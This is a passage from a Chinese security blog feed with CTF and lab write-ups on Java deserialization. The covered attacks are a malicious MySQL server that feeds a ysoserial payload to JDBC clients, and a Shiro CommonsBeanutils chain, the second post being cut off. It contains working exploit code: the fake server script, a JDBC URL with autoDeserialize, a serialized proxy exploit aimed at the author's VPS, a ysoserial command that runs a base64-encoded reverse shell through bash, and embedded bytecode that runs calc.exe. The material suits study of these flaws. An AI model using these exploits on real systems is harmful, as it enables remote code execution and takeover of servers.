class="line"><span class="comment"># 主要逻辑</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>():</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        conn, addr = sk.accept()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Connection come from &#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(addr[<span class="number">0</span>],addr[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 1.先发送第一个 问候报文</span></span><br><span class="line">        send_data(conn,greeting_data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok</span></span><br><span class="line">            receive_data(conn)</span><br><span class="line">            send_data(conn,response_ok_data)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#其他过程</span></span><br><span class="line">            data=receive_data(conn)</span><br><span class="line">            <span class="comment">#查询一些配置信息,其中会发送自己的 版本号</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;session.auto_increment_increment&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                _payload=<span class="string">&#x27;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn,_payload)</span><br><span class="line">                data=receive_data(conn)</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&quot;show warnings&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                _payload = <span class="string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn, _payload)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;set names&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn, response_ok_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;set character_set_results&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn, response_ok_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;show session status&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                mysql_data = <span class="string">&#x27;0100000102&#x27;</span></span><br><span class="line">                mysql_data += <span class="string">&#x27;1a000002036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span></span><br><span class="line">                mysql_data += <span class="string">&#x27;1a000003036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span></span><br><span class="line">                <span class="comment"># 为什么我加了EOF Packet 就无法正常运行呢？？</span></span><br><span class="line">                <span class="comment"># 获取payload</span></span><br><span class="line">                payload_content=get_payload_content()</span><br><span class="line">                <span class="comment"># 计算payload长度</span></span><br><span class="line">                payload_length = <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload_content)//<span class="number">2</span>)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>).zfill(<span class="number">4</span>)</span><br><span class="line">                payload_length_hex = payload_length[<span class="number">2</span>:<span class="number">4</span>] + payload_length[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                <span class="comment"># 计算数据包长度</span></span><br><span class="line">                data_len = <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload_content)//<span class="number">2</span> + <span class="number">4</span>)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>).zfill(<span class="number">6</span>)</span><br><span class="line">                data_len_hex = data_len[<span class="number">4</span>:<span class="number">6</span>] + data_len[<span class="number">2</span>:<span class="number">4</span>] + data_len[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                mysql_data += data_len_hex + <span class="string">&#x27;04&#x27;</span> + <span class="string">&#x27;fbfc&#x27;</span>+ payload_length_hex</span><br><span class="line">                mysql_data += <span class="built_in">str</span>(payload_content)</span><br><span class="line">                mysql_data += <span class="string">&#x27;07000005fe000022000100&#x27;</span></span><br><span class="line">                send_data(conn, mysql_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;show warnings&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                payload = <span class="string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn, payload)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    HOST =<span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">    PORT = <span class="number">3306</span></span><br><span class="line"></span><br><span class="line">    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="comment">#当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间</span></span><br><span class="line">    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    sk.bind((HOST, PORT))</span><br><span class="line">    sk.listen(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;start fake mysql server listening on &#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(HOST,PORT))</span><br><span class="line"></span><br><span class="line">    run()</span><br></pre></td></tr></table></figure><p>然后我们是用cc链来测试的，客户端肯定要有cc依赖哈，然后利用<code>ysoserial</code>来生成cc7的<code>payload</code>，放到<code>payload</code>文件中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar yso*.jar CommonsCollections7 calc &gt; payload</span><br></pre></td></tr></table></figure><p>然后运行这个py文件，开始监听：</p><p><img src="https://s2.loli.net/2022/03/19/izLMIPD95Ydnlom.png" alt="image.png"></p><p>接下来就来写客户端的代码，很简单，先放代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">        String jdbc_url = <span class="string">&quot;jdbc:mysql://xx.xx.xx.xxx:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>;</span><br><span class="line">        Connection con = DriverManager.getConnection(jdbc_url, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;root&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要就是看这两个参数<code>?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</code></p><p>第一个参数<code>autoDeserialize</code>是用来自动检测与反序列化存在BLOB字段中的对象，为了满足下面的条件，这其实挺简单，记得加上就行</p><p>第二个参数就稍微有点儿复杂了，<code>ServerStatusDiffInterceptor</code>是一个拦截器，当我们在<code>JDBC url</code>中设置属性<code>queryInterceptors</code>为<code>ServerStatusDiffInterceptor</code>时，在执行<code>SQL</code>的查询语句的时候，会调用拦截器的<code>postProcess</code>方法，然后调用<code>populateMapWithSessionStatusValues</code>方法，然后调用<code>resultSetToMap</code>方法，然后调用<code>getObject</code>方法，在<code>getObject</code>中，只要<code>autoDeserialize</code> 为True，就可以进入到最后<code>readObject</code>中，最终实现反序列化；而我们前面说到了，当通过<code>JDBC</code>连接数据库的时候，会有几个内置的<code>SQL</code>语句会被执行，所以说这样就通了，而这就是这两个参数的由来，调用链不算很难，我也就不放代码了，给一篇参考文章：<a href="https://xz.aliyun.com/t/8159">https://xz.aliyun.com/t/8159</a></p><p>运行客户端代码，弹出计算器：</p><p><img src="https://s2.loli.net/2022/03/19/CabYxq1DZsGV5KM.png" alt="image.png"></p><h2 id="例题解析-—-羊城杯-2020-A-Piece-Of-Java"><a href="#例题解析-—-羊城杯-2020-A-Piece-Of-Java" class="headerlink" title="例题解析 — [羊城杯 2020]A Piece Of Java"></a>例题解析 — [羊城杯 2020]A Piece Of Java</h2><p>这是我人生中做出的第一道CTF的<code>Java</code>题，还挺有纪念意义的哈哈哈，buu上就能复现</p><p>这道题给出了源码，放<code>idea</code>中先审审源码：</p><p>在入口中看到了<code>/hello</code>下面有一个<code>deserialize</code>，而且它反序列化的是<code>Cookie</code>中的<code>data</code>字段的值，我们是可控的，看看<code>deserialize</code></p><p>看到了硕大的一个<code>readObject()</code>，而且它是先<code>base64</code>解码之后再进行的<code>readObject()</code></p><p>然后我们去看<code>InfoInvocationHandler</code>类，听这个名字就感觉大概是动态代理类，而且里面实现了<code>InvocationHandler</code>和<code>Serializable</code>俩接口，只重写了<code>invoke</code>方法，肯定是个动态代理类，那么通过调用<code>invoke</code>方法，在<code>invoke</code>方法里面调用了<code>checkAllInfo()</code>方法，那么只要我们让<code>this.info</code>是一个<code>DatabaseInfo</code>对象，就可以调用<code>DatabaseInfo</code>对象的<code>checkAllInfo</code>方法了，然后在里面调用了<code>this.connect()</code>方法，连接数据库了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DatabaseInfo</span> <span class="keyword">implements</span> <span class="title">Serializable</span>, <span class="title">Info</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String host;</span><br><span class="line">    <span class="keyword">private</span> String port;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="keyword">private</span> Connection connection;</span><br><span class="line"> <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">connect</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String url = <span class="string">&quot;jdbc:mysql://&quot;</span> + <span class="keyword">this</span>.host + <span class="string">&quot;:&quot;</span> + <span class="keyword">this</span>.port + <span class="string">&quot;/jdbc?user=&quot;</span> + <span class="keyword">this</span>.username + <span class="string">&quot;&amp;password=&quot;</span> + <span class="keyword">this</span>.password + <span class="string">&quot;&amp;connectTimeout=3000&amp;socketTimeout=6000&quot;</span>;</span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.connection = DriverManager.getConnection(url);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var3) &#123;</span><br><span class="line">            var3.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Boolean <span class="title">checkAllInfo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.host != <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.port != <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.username != <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.password != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.connection == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">this</span>.connect();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那其实思路挺简单的，利用动态代理调用<code>invoke</code>，然后通过<code>connect()</code>方法连接我们vps上的恶意数据库实现RCE，写exp了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gdufs.challenge.web.invocation.InfoInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> gdufs.challenge.web.model.DatabaseInfo;</span><br><span class="line"><span class="keyword">import</span> gdufs.challenge.web.model.Info;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldname, Object value)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldname);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] serialize(Object o) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">            ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">            ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">            oos.writeObject(o);</span><br><span class="line">            <span class="keyword">return</span> barr.toByteArray();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        DatabaseInfo databaseInfo = <span class="keyword">new</span> DatabaseInfo();</span><br><span class="line">        setFieldValue(databaseInfo, <span class="string">&quot;host&quot;</span>, <span class="string">&quot;xx.xx.xx.xx&quot;</span>);</span><br><span class="line">        setFieldValue(databaseInfo, <span class="string">&quot;port&quot;</span>, <span class="string">&quot;3306&quot;</span>);</span><br><span class="line">        setFieldValue(databaseInfo, <span class="string">&quot;username&quot;</span>, <span class="string">&quot;Arsene.Tang&quot;</span>);</span><br><span class="line">        setFieldValue(databaseInfo, <span class="string">&quot;password&quot;</span>, <span class="string">&quot;clyyyyy&amp;autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>);</span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;gdufs.challenge.web.invocation.InfoInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor construct = clazz.getDeclaredConstructor(Info.class);</span><br><span class="line">        construct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InfoInvocationHandler handler = (InfoInvocationHandler) construct.newInstance(databaseInfo);</span><br><span class="line">        Info proxinfo = (Info) Proxy.newProxyInstance(Info.class.getClassLoader(), <span class="keyword">new</span> Class[] &#123;Info.class&#125;, handler);</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = serialize(proxinfo);</span><br><span class="line">        <span class="keyword">byte</span>[] payload = Base64.getEncoder().encode(bytes);</span><br><span class="line">        System.out.print(<span class="keyword">new</span> String(payload));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前两个方法分别是反射给属性赋值的方法以及序列化的方法，然后在主函数中创建<code>DatabaseInfo</code>对象，用反射赋值，获取代理类对象，最后将序列化后的结果<code>base64</code>加密之后输出出来，很清晰的流程</p><p>然后我们在vps中生成一个反弹shell的<code>payload</code>，还是写入到<code>payload</code>文件中，就和我们本地测试的一样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar yso*.jar CommonsCollections5 &quot;bash -c &#123;echo,反弹shell的语句base64后&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; payload</span><br></pre></td></tr></table></figure><p>然后运行上面那个py文件，运行<code>Mysql</code>恶意服务器，将<code>payload</code>打过去，别忘了监听端口：</p><p><img src="https://s2.loli.net/2022/03/19/GdXipBVzw9CQLPM.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/03/19/dUfYQGMkc8XaTjP.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/03/19/XcevYzMAQ1b2sO9.png" alt="image.png"></p><p>shell成功弹回来，拿下</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;jdbc反序列化&quot;&gt;&lt;a href=&quot;#jdbc反序列化&quot; class=&quot;headerlink&quot; title=&quot;jdbc反序列化&quot;&gt;&lt;/a&gt;jdbc反序列化&lt;/h1&gt;&lt;p&gt;这几天有点儿痛苦，看完了p神的&lt;code&gt;Java&lt;/code&gt;安全漫谈之后有点儿迷茫，&lt;code&gt;jndi&lt;/code&gt;看了看，&lt;code&gt;fastjson&lt;/code&gt;看了看，&lt;code&gt;jdbc&lt;/code&gt;也看了看，但感觉都看的不太细，很多东西也没搞明白，写文章感觉有点儿难受，所以说一周多都没更了，接下来就慢慢学着慢慢总结着吧，先来看看&lt;code&gt;jdbc&lt;/code&gt;反序列化&lt;/p&gt;</summary>
    
    
    
    
    <category term="Java" scheme="https://arsenetang.github.io/tags/Java/"/>
    
    <category term="ctf" scheme="https://arsenetang.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Java篇之利用CB链攻击shiro</title>
    <link href="https://arsenetang.github.io/2022/03/10/Java%E7%AF%87%E4%B9%8B%E5%88%A9%E7%94%A8CB%E9%93%BE%E6%94%BB%E5%87%BBshiro/"/>
    <id>https://arsenetang.github.io/2022/03/10/Java%E7%AF%87%E4%B9%8B%E5%88%A9%E7%94%A8CB%E9%93%BE%E6%94%BB%E5%87%BBshiro/</id>
    <published>2022-03-09T16:00:00.000Z</published>
    <updated>2022-03-10T09:34:55.644Z</updated>
    
    <content type="html"><![CDATA[<h1 id="利用CB链攻击shiro"><a href="#利用CB链攻击shiro" class="headerlink" title="利用CB链攻击shiro"></a>利用CB链攻击shiro</h1><p>上一篇文章我们讲到了CB链，通过CB链弹出了计算器，那我们自然就会想到能不能利用CB链经过加密之后去攻击<code>shiro</code>呢？肯定是可以的，而且还挺简单的，和上篇文章基本类似，就是说有几个注意事项</p><span id="more"></span><p>既然说这篇文章我们要用CB链去打<code>shiro</code>，那肯定就用不到CC的依赖了，因为实际情况下很可能目标并没有安装<code>commons-collections</code>依赖，所以说我们也需要先去掉cc的依赖，就用上次p神写的<code>shiro_demo</code>就行了，在<code>pom.xml</code>里面删除cc有关的依赖，然后用<code>maven</code>重新加载项目，然后我们再看外部库里面就没有cc的依赖了</p><p><img src="https://s2.loli.net/2022/03/10/ufFga42BUMALQKb.png" alt="image.png"></p><p>但是如果我们仔细点儿观察<code>pom.xml</code>，会发现我们并没有导入CB的依赖，但是外部库里面却有CB，这是为什么呢？因为<code>Shiro</code>是依赖于<code>commons-beanutils</code>的，所以说只要有<code>shiro</code>就一定有CB，用CB利用链肯定会更加方便</p><h2 id="构造POC"><a href="#构造POC" class="headerlink" title="构造POC"></a>构造POC</h2><p>我们就先按照上一篇构造的CB链再加上加密过程先生成payload来试试：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cb_shiro</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIwoABwAUBwAVCAAWCgAXABgKABcAGQcAGgcAGwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAcAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAHQEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAA8AEAEAEGphdmEvbGFuZy9TdHJpbmcBAAhjYWxjLmV4ZQcAHgwAHwAgDAAhACIBABN5c29zZXJpYWwvdGVzdC9ldmlsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYABwAAAAAAAwABAAgACQACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAACwAMAAAABAABAA0AAQAIAA4AAgAKAAAAGQAAAAQAAAABsQAAAAEACwAAAAYAAQAAAA0ADAAAAAQAAQANAAEADwAQAAIACgAAADsABAACAAAAFyq3AAEEvQACWQMSA1NMuAAEK7YABVexAAAAAQALAAAAEgAEAAAADwAEABAADgARABYAEgAMAAAABAABABEAAQASAAAAAgAT&quot;</span>);</span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Arsene.Tang&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        BeanComparator comparator = <span class="keyword">new</span> BeanComparator();</span><br><span class="line">        Queue queue = <span class="keyword">new</span> PriorityQueue(<span 